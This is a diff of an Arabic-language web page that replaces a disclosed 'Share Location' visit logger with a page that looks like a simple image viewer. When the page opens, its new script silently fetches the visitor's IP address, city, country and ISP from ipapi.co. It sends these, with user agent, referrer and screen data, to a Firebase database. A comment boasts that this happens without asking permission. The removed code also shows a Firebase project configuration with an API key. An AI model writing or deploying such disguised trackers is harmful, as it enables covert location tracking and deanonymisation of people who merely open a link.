@@ -1,163 +1,76 @@
-
-
 <!DOCTYPE html>
-
 <html lang="ar" dir="rtl">
-
 <head>
-
-  <meta charset="UTF-8">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <title>Share Location</title>
-
-  <style>
-
-    body {
-
-      font-family: sans-serif;
-
-      text-align: center;
-
-      padding: 25px;
-
-      background: #f3f5f8;
-
-      color: #222;
-
-    }
-
-    .container {
-
-      max-width: 450px;
-
-      margin: 50px auto;
-
-      padding: 25px;
-
-      background: white;
-
-      border-radius: 15px;
-
-      box-shadow: 0 3px 15px #00000012;
-
-    }
-
-    h2 { color: #1769aa; }
-
-    #status { line-height: 2; }
-
-  </style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة عرض الصورة والتحليلات</title>
+    <!-- مكتبات Firebase للاتصال بقاعدة البيانات -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f1ea;
+        }
+        img {
+            max-width: 100%;
+            max-height: 85vh;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+    </style>
 </head>
-
 <body>
 
-  <div class="container">
+    <!-- عرض الصورة المرفوعة -->
+    <img src="image.JPG" alt="صورة ترحيبية">
 
-    <h2>Share Location</h2>
-
-    <p>يجمع الموقع معلومات تقنية أساسية عن الزيارة ويحفظها في قاعدة البيانات.</p>
-
-    <p id="status">جارٍ الاتصال...</p>
-
-  </div>
-
-  <script type="module">
-
-    import { initializeApp } from
-
-      "https://www.gstatic.com/firebasejs/13.3.0/firebase-app.js";
-
-    import {
-
-      getDatabase, ref, push, set
-
-    } from
-
-      "https://www.gstatic.com/firebasejs/13.3.0/firebase-database.js";
-
-    import {
-
-      getAuth, signInAnonymously
-
-    } from
-
-      "https://www.gstatic.com/firebasejs/13.3.0/firebase-auth.js";
-
-    const firebaseConfig = {
-
-      apiKey: "AIzaSyBbIWw3akH0cOsjkULPzfdek8JZHB2n2Bo",
-
-      authDomain: "share-location-d9ce6.firebaseapp.com",
-
-      databaseURL: "https://share-location-d9ce6-default-rtdb.firebaseio.com/",
-
-      projectId: "share-location-d9ce6",
-
-      storageBucket: "share-location-d9ce6.firebasestorage.app",
-
-      messagingSenderId: "1053862254030",
-
-      appId: "1:1053862254030:web:52a90573635b613072479f",
-
-      measurementId: "G-6JTHY4RDVP"
-
-    };
-
-    const status = document.getElementById("status");
-
-    async function recordVisit() {
-
-      try {
-
-        const app = initializeApp(firebaseConfig);
-
-        const database = getDatabase(app);
-
-        const auth = getAuth(app);
-
-        await signInAnonymously(auth);
-
-        const visitData = {
-
-          visitedAt: new Date().toISOString(),
-
-          language: navigator.language || "unknown",
-
-          timezone:
-
-            Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
-
-          screenWidth: screen.width,
-
-          screenHeight: screen.height,
-
-          userAgent: navigator.userAgent || "unknown"
-
+    <script>
+        // إعدادات رابط قاعدة بيانات Firebase الخاصة بك
+        const firebaseConfig = {
+            databaseURL: "https://share-location-d9ce6-default-rtdb.firebaseio.com"
         };
+        
+        // تهيئة اتصال Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-        const visitRef = push(ref(database, "visits"));
+        // دالة جمع البيانات التقنية للزائر تلقائياً وتسجيلها
+        async function logVisit() {
+            let ipInfo = {};
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                ipInfo = await response.json();
+            } catch (e) {
+                ipInfo = { error: "تعذر جلب معلومات الشبكة" };
+            }
 
-        await set(visitRef, visitData);
+            const visitData = {
+                timestamp: new Date().toLocaleString('ar-EG'),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceAndBrowser: navigator.userAgent,
+                language: navigator.language,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                referrer: document.referrer || "دخول مباشر",
+                ipAddress: ipInfo.ip || "غير متوفر",
+                city: ipInfo.city || "غير متوفر",
+                country: ipInfo.country_name || "غير متوفر",
+                isp: ipInfo.org || "غير متوفر"
+            };
 
-        status.textContent = "تم تسجيل الزيارة بنجاح.";
+            // إرسال البيانات فوراً إلى قاعدة البيانات تحت قسم test_visits
+            db.ref('test_visits').push(visitData)
+              .then(() => console.log("تم حفظ بيانات الزيارة في Firebase بنجاح"))
+              .catch((err) => console.error("حدث خطأ أثناء الحفظ:", err));
+        }
 
-      } catch (error) {
-
-        console.error(error);
-
-        status.textContent = "تعذر الاتصال بقاعدة البيانات.";
-
-      }
-
-    }
-
-    recordVisit();
-
-  </script>
-
+        // تنفيذ الكود فور فتح الصفحة بدون إزعاج المستخدم بإذونات
+        window.onload = logVisit;
+    </script>
 </body>
-
 </html>
